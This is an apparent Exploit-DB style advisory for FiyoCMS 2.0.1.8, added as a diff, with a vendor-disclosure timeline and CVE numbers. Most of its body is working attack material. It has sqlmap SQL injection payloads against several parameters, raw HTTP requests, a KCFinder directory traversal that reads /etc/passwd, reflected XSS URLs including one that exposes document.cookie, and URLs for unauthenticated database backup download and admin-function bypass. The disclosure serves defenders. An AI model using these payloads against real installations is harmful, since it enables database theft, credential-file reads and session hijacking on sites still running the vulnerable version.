@@ -1,0 +1,193 @@
+# Exploit Title: FiyoCMS Multiple Vulnerabilities
+# Date: 29 March 2015
+# Exploit Author: Mahendra
+# Vendor Homepage: www.fiyo.org
+# Software Link: http://sourceforge.net/projects/fiyo-cms/
+# Version: 2.0.1.8, other version might be vulnerable.
+# Tested : Kali Linux 1.0.9a-amd64
+# CVE(s): CVE-2014-9145,CVE-2014-9146,CVE-2014-9147,CVE-2014-9148
+
+*Advisory Timeline*
+30-11-2014: Vendor notified and responded back
+01-12-2014: Vulnerabilities provided to vendor
+03-14-2015: Vendor released newer version claimed to fix the vulnerabilities
+29-03-2015: Advisory released
+
+----------------------------------------------------
+FiyoCMS 2.0.1.8 SQL injection, XSS, Direct URL bypass
+----------------------------------------------------
+*Advisory details*
+
+Several security issues have been identified on the latest FiyoCMS platform.
+
+
+*Proof of Concept (PoC)*
+
+----------------------------------------------------
+Multiple SQL Injection - CVE-2014-9145
+----------------------------------------------------
+
+* PoC:
+
+http://192.168.248.132/fiyo/dapur/index.php?app=user&act=edit&id=1[sqli]
+
+* Sqlmap:
+
+Parameter: id
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 10 columns
+    Payload: app=user&act=edit&id=-7672 UNION ALL SELECT NULL,NULL,CONCAT(0x7171676471,0x66457070464452786c58,0x716a767471),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: app=user&act=edit&id=1 AND SLEEP(5)
+
+* PoC:
+
+http://192.168.248.132/fiyo/dapur/apps/app_article/controller/article_list.php?cat=[sqli]&user=[sqli]&level=[sqli]&sEcho=1&iColumns=7&sColumns=&iDisplayStart=0&iDisplayLength=10&mDataProp_0=0&mDataProp_1=1&mDataProp_2=2&mDataProp_3=3&mDataProp_4=4&mDataProp_5=5&mDataProp_6=6&sSearch=&bRegex=false&sSearch_0=&bRegex_0=false&bSearchable_0=true&sSearch_1=&bRegex_1=false&bSearchable_1=true&sSearch_2=&bRegex_2=false&bSearchable_2=true&sSearch_3=&bRegex_3=false&bSearchable_3=true&sSearch_4=&bRegex_4=false&bSearchable_4=true&sSearch_5=&bRegex_5=false&bSearchable_5=true&sSearch_6=&bRegex_6=false&bSearchable_6=true&iSortCol_0=0&sSortDir_0=asc&iSortingCols=1&bSortable_0=true&bSortable_1=true&bSortable_2=true&bSortable_3=true&bSortable_4=true&bSortable_5=true&bSortable_6=true&_=1417159921913
+
+* Sqlmap:
+
+Parameter: cat
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: cat=' AND (SELECT 4352 FROM(SELECT COUNT(*),CONCAT(0x71666f7671,(SELECT (CASE WHEN (4352=4352) THEN 1 ELSE 0 END)),0x7164687671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'yeEe'='yeEe&user=&level=&sEcho=1&iColumns=7&sColumns=&iDisplayStart=0&iDisplayLength=10&mDataProp_0=0&mDataProp_1=1&mDataProp_2=2&mDataProp_3=3&mDataProp_4=4&mDataProp_5=5&mDataProp_6=6&sSearch=&bRegex=false&sSearch_0=&bRegex_0=false&bSearchable_0=true&sSearch_1=&bRegex_1=false&bSearchable_1=true&sSearch_2=&bRegex_2=false&bSearchable_2=true&sSearch_3=&bRegex_3=false&bSearchable_3=true&sSearch_4=&bRegex_4=false&bSearchable_4=true&sSearch_5=&bRegex_5=false&bSearchable_5=true&sSearch_6=&bRegex_6=false&bSearchable_6=true&iSortCol_0=0&sSortDir_0=asc&iSortingCols=1&bSortable_0=true&bSortable_1=true&bSortable_2=true&bSortable_3=true&bSortable_4=true&bSortable_5=true&bSortable_6=true&_=1417159921913
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 10 columns
+    Payload: cat=' UNION ALL SELECT NULL,CONCAT(0x71666f7671,0x4f654364434f746c7477,0x7164687671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#&user=&level=&sEcho=1&iColumns=7&sColumns=&iDisplayStart=0&iDisplayLength=10&mDataProp_0=0&mDataProp_1=1&mDataProp_2=2&mDataProp_3=3&mDataProp_4=4&mDataProp_5=5&mDataProp_6=6&sSearch=&bRegex=false&sSearch_0=&bRegex_0=false&bSearchable_0=true&sSearch_1=&bRegex_1=false&bSearchable_1=true&sSearch_2=&bRegex_2=false&bSearchable_2=true&sSearch_3=&bRegex_3=false&bSearchable_3=true&sSearch_4=&bRegex_4=false&bSearchable_4=true&sSearch_5=&bRegex_5=false&bSearchable_5=true&sSearch_6=&bRegex_6=false&bSearchable_6=true&iSortCol_0=0&sSortDir_0=asc&iSortingCols=1&bSortable_0=true&bSortable_1=true&bSortable_2=true&bSortable_3=true&bSortable_4=true&bSortable_5=true&bSortable_6=true&_=1417159921913
+
+    Type: AND/OR time-based blind
+    Title: MySQL < 5.0.12 AND time-based blind (heavy query)
+    Payload: cat=' AND 2332=BENCHMARK(5000000,MD5(0x4a495770)) AND 'RlLS'='RlLS&user=&level=&sEcho=1&iColumns=7&sColumns=&iDisplayStart=0&iDisplayLength=10&mDataProp_0=0&mDataProp_1=1&mDataProp_2=2&mDataProp_3=3&mDataProp_4=4&mDataProp_5=5&mDataProp_6=6&sSearch=&bRegex=false&sSearch_0=&bRegex_0=false&bSearchable_0=true&sSearch_1=&bRegex_1=false&bSearchable_1=true&sSearch_2=&bRegex_2=false&bSearchable_2=true&sSearch_3=&bRegex_3=false&bSearchable_3=true&sSearch_4=&bRegex_4=false&bSearchable_4=true&sSearch_5=&bRegex_5=false&bSearchable_5=true&sSearch_6=&bRegex_6=false&bSearchable_6=true&iSortCol_0=0&sSortDir_0=asc&iSortingCols=1&bSortable_0=true&bSortable_1=true&bSortable_2=true&bSortable_3=true&bSortable_4=true&bSortable_5=true&bSortable_6=true&_=1417159921913
+
+Parameter: level
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: cat=&user=&level=' AND (SELECT 6522 FROM(SELECT COUNT(*),CONCAT(0x71666f7671,(SELECT (CASE WHEN (6522=6522) THEN 1 ELSE 0 END)),0x7164687671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'Pqqp'='Pqqp&sEcho=1&iColumns=7&sColumns=&iDisplayStart=0&iDisplayLength=10&mDataProp_0=0&mDataProp_1=1&mDataProp_2=2&mDataProp_3=3&mDataProp_4=4&mDataProp_5=5&mDataProp_6=6&sSearch=&bRegex=false&sSearch_0=&bRegex_0=false&bSearchable_0=true&sSearch_1=&bRegex_1=false&bSearchable_1=true&sSearch_2=&bRegex_2=false&bSearchable_2=true&sSearch_3=&bRegex_3=false&bSearchable_3=true&sSearch_4=&bRegex_4=false&bSearchable_4=true&sSearch_5=&bRegex_5=false&bSearchable_5=true&sSearch_6=&bRegex_6=false&bSearchable_6=true&iSortCol_0=0&sSortDir_0=asc&iSortingCols=1&bSortable_0=true&bSortable_1=true&bSortable_2=true&bSortable_3=true&bSortable_4=true&bSortable_5=true&bSortable_6=true&_=1417159921913
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 10 columns
+    Payload: cat=&user=&level=' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71666f7671,0x6163446a67456e557a48,0x7164687671),NULL,NULL,NULL#&sEcho=1&iColumns=7&sColumns=&iDisplayStart=0&iDisplayLength=10&mDataProp_0=0&mDataProp_1=1&mDataProp_2=2&mDataProp_3=3&mDataProp_4=4&mDataProp_5=5&mDataProp_6=6&sSearch=&bRegex=false&sSearch_0=&bRegex_0=false&bSearchable_0=true&sSearch_1=&bRegex_1=false&bSearchable_1=true&sSearch_2=&bRegex_2=false&bSearchable_2=true&sSearch_3=&bRegex_3=false&bSearchable_3=true&sSearch_4=&bRegex_4=false&bSearchable_4=true&sSearch_5=&bRegex_5=false&bSearchable_5=true&sSearch_6=&bRegex_6=false&bSearchable_6=true&iSortCol_0=0&sSortDir_0=asc&iSortingCols=1&bSortable_0=true&bSortable_1=true&bSortable_2=true&bSortable_3=true&bSortable_4=true&bSortable_5=true&bSortable_6=true&_=1417159921913
+
+    Type: AND/OR time-based blind
+    Title: MySQL < 5.0.12 AND time-based blind (heavy query)
+    Payload: cat=&user=&level=' AND 6567=BENCHMARK(5000000,MD5(0x57586864)) AND 'hMLH'='hMLH&sEcho=1&iColumns=7&sColumns=&iDisplayStart=0&iDisplayLength=10&mDataProp_0=0&mDataProp_1=1&mDataProp_2=2&mDataProp_3=3&mDataProp_4=4&mDataProp_5=5&mDataProp_6=6&sSearch=&bRegex=false&sSearch_0=&bRegex_0=false&bSearchable_0=true&sSearch_1=&bRegex_1=false&bSearchable_1=true&sSearch_2=&bRegex_2=false&bSearchable_2=true&sSearch_3=&bRegex_3=false&bSearchable_3=true&sSearch_4=&bRegex_4=false&bSearchable_4=true&sSearch_5=&bRegex_5=false&bSearchable_5=true&sSearch_6=&bRegex_6=false&bSearchable_6=true&iSortCol_0=0&sSortDir_0=asc&iSortingCols=1&bSortable_0=true&bSortable_1=true&bSortable_2=true&bSortable_3=true&bSortable_4=true&bSortable_5=true&bSortable_6=true&_=1417159921913
+
+  
+Parameter: user
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: cat=&user=' AND (SELECT 8990 FROM(SELECT COUNT(*),CONCAT(0x71666f7671,(SELECT (CASE WHEN (8990=8990) THEN 1 ELSE 0 END)),0x7164687671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'VhKM'='VhKM&level=&sEcho=1&iColumns=7&sColumns=&iDisplayStart=0&iDisplayLength=10&mDataProp_0=0&mDataProp_1=1&mDataProp_2=2&mDataProp_3=3&mDataProp_4=4&mDataProp_5=5&mDataProp_6=6&sSearch=&bRegex=false&sSearch_0=&bRegex_0=false&bSearchable_0=true&sSearch_1=&bRegex_1=false&bSearchable_1=true&sSearch_2=&bRegex_2=false&bSearchable_2=true&sSearch_3=&bRegex_3=false&bSearchable_3=true&sSearch_4=&bRegex_4=false&bSearchable_4=true&sSearch_5=&bRegex_5=false&bSearchable_5=true&sSearch_6=&bRegex_6=false&bSearchable_6=true&iSortCol_0=0&sSortDir_0=asc&iSortingCols=1&bSortable_0=true&bSortable_1=true&bSortable_2=true&bSortable_3=true&bSortable_4=true&bSortable_5=true&bSortable_6=true&_=1417159921913
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 10 columns
+    Payload: cat=&user=' UNION ALL SELECT NULL,CONCAT(0x71666f7671,0x4652577247546e6b5241,0x7164687671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#&level=&sEcho=1&iColumns=7&sColumns=&iDisplayStart=0&iDisplayLength=10&mDataProp_0=0&mDataProp_1=1&mDataProp_2=2&mDataProp_3=3&mDataProp_4=4&mDataProp_5=5&mDataProp_6=6&sSearch=&bRegex=false&sSearch_0=&bRegex_0=false&bSearchable_0=true&sSearch_1=&bRegex_1=false&bSearchable_1=true&sSearch_2=&bRegex_2=false&bSearchable_2=true&sSearch_3=&bRegex_3=false&bSearchable_3=true&sSearch_4=&bRegex_4=false&bSearchable_4=true&sSearch_5=&bRegex_5=false&bSearchable_5=true&sSearch_6=&bRegex_6=false&bSearchable_6=true&iSortCol_0=0&sSortDir_0=asc&iSortingCols=1&bSortable_0=true&bSortable_1=true&bSortable_2=true&bSortable_3=true&bSortable_4=true&bSortable_5=true&bSortable_6=true&_=1417159921913
+
+    Type: AND/OR time-based blind
+    Title: MySQL < 5.0.12 AND time-based blind (heavy query)
+    Payload: cat=&user=' AND 1262=BENCHMARK(5000000,MD5(0x72797451)) AND 'egJe'='egJe&level=&sEcho=1&iColumns=7&sColumns=&iDisplayStart=0&iDisplayLength=10&mDataProp_0=0&mDataProp_1=1&mDataProp_2=2&mDataProp_3=3&mDataProp_4=4&mDataProp_5=5&mDataProp_6=6&sSearch=&bRegex=false&sSearch_0=&bRegex_0=false&bSearchable_0=true&sSearch_1=&bRegex_1=false&bSearchable_1=true&sSearch_2=&bRegex_2=false&bSearchable_2=true&sSearch_3=&bRegex_3=false&bSearchable_3=true&sSearch_4=&bRegex_4=false&bSearchable_4=true&sSearch_5=&bRegex_5=false&bSearchable_5=true&sSearch_6=&bRegex_6=false&bSearchable_6=true&iSortCol_0=0&sSortDir_0=asc&iSortingCols=1&bSortable_0=true&bSortable_1=true&bSortable_2=true&bSortable_3=true&bSortable_4=true&bSortable_5=true&bSortable_6=true&_=1417159921913
+    
+* PoC:
+    POST /fiyo/dapur/apps/app_user/controller/check_user.php HTTP/1.1
+    Host: 192.168.248.132
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
+    Accept: */*
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    X-Requested-With: XMLHttpRequest
+    Referer: http://192.168.248.132/fiyo/dapur/index.php?app=user&act=add
+    Content-Length: 42
+    Cookie: PHPSESSID=0nij9ucentr8p4ih41d0p61476; KCFINDER_showname=on; KCFINDER_showsize=off; KCFINDER_showtime=off; KCFINDER_order=name; KCFINDER_orderDesc=off; KCFINDER_view=thumbs; KCFINDER_displaySettings=off
+    Connection: keep-alive
+    Pragma: no-cache
+    Cache-Control: no-cache
+
+    act=email&email=test@asdas.com[sqli]
+
+* Sqlmap:
+
+Parameter: email
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: act=email&email=test@asdas.com' AND 5514=5514 AND 'KTqH'='KTqH
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: act=email&email=test@asdas.com' AND SLEEP(5) AND 'UjqT'='UjqT
+
+* PoC:
+
+    POST /fiyo/dapur/apps/app_user/controller/check_user.php HTTP/1.1
+    Host: 192.168.248.132
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
+    Accept: */*
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    X-Requested-With: XMLHttpRequest
+    Referer: http://192.168.248.132/fiyo/dapur/index.php?app=user&act=add
+    Content-Length: 34
+    Cookie: PHPSESSID=0nij9ucentr8p4ih41d0p61476; KCFINDER_showname=on; KCFINDER_showsize=off; KCFINDER_showtime=off; KCFINDER_order=name; KCFINDER_orderDesc=off; KCFINDER_view=thumbs; KCFINDER_displaySettings=off
+    Connection: keep-alive
+    Pragma: no-cache
+    Cache-Control: no-cache
+
+    act=user&username=test[sqli]
+
+* Sqlmap:
+
+Parameter: username
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: act=user&username=test' AND 5514=5514 AND 'KTqH'='KTqH
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: act=user&username=test' AND SLEEP(5) AND 'UjqT'='UjqT
+
+--------------------------------------------------------------------
+Directory Traversal - kcfinder plugins - CVE-2014-1222
+--------------------------------------------------------------------
+
+FiyoCMS was identified to be using an outdated KCFinder plugin which vulnerable to directory traversal attack.
+
+POST /fiyo//plugins/plg_kcfinder/browse.php?type=files&lng=en&act=download HTTP/1.1
+Host: 192.168.248.132
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.248.132/fiyo//plugins/plg_kcfinder/browse.php?type=files
+Cookie: PHPSESSID=0nij9ucentr8p4ih41d0p61476; KCFINDER_showname=on; KCFINDER_showsize=off; KCFINDER_showtime=off; KCFINDER_order=name; KCFINDER_orderDesc=off; KCFINDER_view=thumbs; KCFINDER_displaySettings=off
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+
+dir=files&file=../../../../../../../etc/passwd
+
+----------------------------------------------------
+Reflected XSS  - CVE-2014-9146
+----------------------------------------------------
+
+http://192.168.248.132/fiyo/?app=article&view=item31ab2"><script>alert(1)</script>0ccba&id=186
+http://192.168.248.132/fiyo/?app=article&view=item&id=18690fdb"><script>alert(1)</script>d99c9
+http://192.168.248.132/fiyo/?page=5eac15eac1"><script>alert(1)</script>774f2
+http://192.168.248.132/fiyo/?app=article95ce1"><script>alert(1)</script>298ab&view=item&id=186
+http://192.168.248.132/fiyo/dapur/index.php?app=module&act=edit%22%3E%3C/script%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&id=5
+
+
+----------------------------------------------------
+Direct URL Access - CVE-2014-9147
+----------------------------------------------------
+To download database backup without any authentications required.
+http://192.168.248.132/fiyo/.backup/[db_backup.sql filename]
+
+----------------------------------------------------
+Access Control Bypass - CVE-2014-9148
+----------------------------------------------------
+
+To access super administrator functions "Install & Update" and "Backup" by administrator user, just go directly to the URL below:
+  1. http://192.168.248.132/fiyo/dapur/?app=config&view=backup
+  2. http://192.168.248.132/fiyo/dapur/?app=config&view=install
